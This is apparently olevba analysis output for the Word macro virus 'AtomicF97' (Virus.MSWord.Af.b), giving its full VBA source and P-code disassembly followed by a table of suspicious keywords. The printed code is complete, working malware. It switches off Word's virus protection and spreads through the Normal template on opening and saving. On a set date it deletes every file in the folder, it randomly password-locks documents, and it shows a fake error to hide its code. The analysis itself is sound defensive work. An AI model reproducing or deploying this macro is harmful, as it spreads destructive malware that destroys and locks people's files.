olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Af.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Af.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AtomicF97.bas 
in file: ./Virus.MSWord.Af.b - OLE stream: 'Macros/VBA/AtomicF97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Atom()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo KillError
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
If D$ = "13/12" Then
    Kill "*.*"
End If
KillError:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AtomicF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserFormM", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserFormT", Object:=wdOrganizerObjectProjectItems
    MsgBox "Atomic Virus est de retour!!!!!", Title:="AtomicF97"
End If
Call Atom
ErrorInfectGlobalTemplate:
End Sub
Function CheckInfected()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
CheckInfected = 0
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
If WordBasic.[MacroName$](i, 0) = "Atomic97" Then
    CheckInfected = -1
End If
Next i
End Function
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileOpen).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AtomicF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormM", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormT", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AtomicF97", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormM", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserFormT", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Dim MyTime
MyTime = Time
T$ = Mid(MyTime, 7, 8)
MsgBox T$
Stop
If T$ = "13" Then
Randomize
N$ = Int(Rnd * 10) + 1
Select Case N$
    Case 1, 2, 3, 4, 5
    ActiveDocument.SaveAs Password:=ActiveDocument.Name
    ActiveDocument.Save
    Case 6, 7, 8, 9, 10
    ActiveDocument.SaveAs Password:=Application.UserName
    ActiveDocument.Save
End Select
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserFormT.Show
    Beep
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserFormM.Show
    Beep
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserFormM.frm 
in file: ./Virus.MSWord.Af.b - OLE stream: 'Macros/VBA/UserFormM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
Unload UserFormM
End Sub
Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub

-------------------------------------------------------------------------------
VBA MACRO UserFormT.frm 
in file: ./Virus.MSWord.Af.b - OLE stream: 'Macros/VBA/UserFormT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
Unload UserFormT
End Sub
Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Af.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AtomicF97 - 5896 bytes
' Line #0:
' 	FuncDefn (Sub Atom())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError KillError 
' Line #5:
' 	Dim 
' 	VarDefn MyDate
' Line #6:
' 	Ld Date 
' 	St MyDate 
' Line #7:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #8:
' 	Ld D$ 
' 	LitStr 0x0005 "13/12"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Label KillError 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub AutoOpen())
' Line #14:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	OnError ErrorInfectGlobalTemplate 
' Line #18:
' 	Ld CheckInfected 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AtomicF97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserFormM"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserFormT"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #22:
' 	LitStr 0x001F "Atomic Virus est de retour!!!!!"
' 	LitStr 0x0009 "AtomicF97"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	ArgsCall (Call) Atom 0x0000 
' Line #25:
' 	Label ErrorInfectGlobalTemplate 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Function CheckInfected())
' Line #28:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #29:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #31:
' 	LitDI2 0x0000 
' 	St CheckInfected 
' Line #32:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #34:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "Atomic97"
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	UMi 
' 	St CheckInfected 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	EndFunc 
' Line #39:
' 	FuncDefn (Sub FileOpen())
' Line #40:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #41:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #43:
' 	OnError InfError 
' Line #44:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #45:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AtomicF97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserFormM"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserFormT"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #49:
' 	Label InfError 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub FileSaveAs())
' Line #52:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #53:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #55:
' 	OnError ErrorFSA 
' Line #56:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #58:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AtomicF97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #59:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserFormM"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #60:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "UserFormT"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #61:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Dim 
' 	VarDefn MyTime
' Line #64:
' 	Ld Time 
' 	St MyTime 
' Line #65:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St T$ 
' Line #66:
' 	Ld T$ 
' 	ArgsCall MsgBox 0x0001 
' Line #67:
' 	Stop 
' Line #68:
' 	Ld T$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	IfBlock 
' Line #69:
' 	ArgsCall Read 0x0000 
' Line #70:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #71:
' 	Ld N$ 
' 	SelectCase 
' Line #72:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #73:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed Password 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #74:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #75:
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #76:
' 	Ld Application 
' 	MemLd UserName 
' 	ParamNamed Password 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #77:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #78:
' 	EndSelect 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Label ErrorFSA 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub FileTemplates())
' Line #83:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #84:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	OnError ErrorFT 
' Line #87:
' 	Ld UserFormT 
' 	ArgsMemCall Show 0x0000 
' Line #88:
' 	ArgsCall Beep 0x0000 
' Line #89:
' 	Label ErrorFT 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub ToolsMacro())
' Line #92:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #93:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #94:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #95:
' 	OnError ErrorTM 
' Line #96:
' 	Ld UserFormM 
' 	ArgsMemCall Show 0x0000 
' Line #97:
' 	ArgsCall Beep 0x0000 
' Line #98:
' 	Label ErrorTM 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub ViewVBCode())
' Line #101:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #102:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #104:
' 	OnError ErrorVVBC 
' Line #105:
' 	LitStr 0x0044 "Ce programme a rйalisй une opйration illйgale et va кtre interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #106:
' 	Label ErrorVVBC 
' Line #107:
' 	EndSub 
' Macros/VBA/UserFormM - 1638 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #3:
' 	Ld UserFormM 
' 	ArgsCall Unlock 0x0001 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	EndSub 
' Line #10:
' Macros/VBA/UserFormT - 1624 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #3:
' 	Ld UserFormT 
' 	ArgsCall Unlock 0x0001 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

